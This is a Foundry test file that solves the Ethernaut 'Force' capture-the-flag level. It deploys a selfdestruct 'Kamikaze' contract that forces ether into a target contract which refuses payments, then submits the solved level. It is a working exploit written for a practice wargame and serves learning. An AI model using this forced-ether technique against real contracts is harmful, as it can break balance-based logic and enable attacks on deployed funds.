// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract Kamikaze {
    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
}

interface IEthernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address _instance) external;
}

contract EthernautForceTest is Test {
    IEthernaut ethernaut = IEthernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    address levelFactory = 0xb6c2Ec883DaAac76D8922519E63f875c2ec65575;

    function testLevel7_Force() public {

        address hacker = makeAddr("hacker");
        vm.deal(hacker, 1 ether);
        vm.startPrank(hacker);

        vm.recordLogs(); 
        ethernaut.createLevelInstance(levelFactory);
        

        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 instanceTopic = entries[entries.length - 1].topics[2];
        address levelAddr = address(uint160(uint256(instanceTopic)));
        
        console.log("Target Force Address:", levelAddr);
        console.log("Saldo Awal Target:", levelAddr.balance);

        console.log("Meluncurkan Kamikaze...");
        
        new Kamikaze{value: 1 wei}(payable(levelAddr));

        console.log("Saldo Akhir Target:", levelAddr.balance);
        
        assertGt(levelAddr.balance, 0);
        console.log("HACKED! Target dipaksa menerima uang.");

        ethernaut.submitLevelInstance(levelAddr);
        vm.stopPrank();
    }
}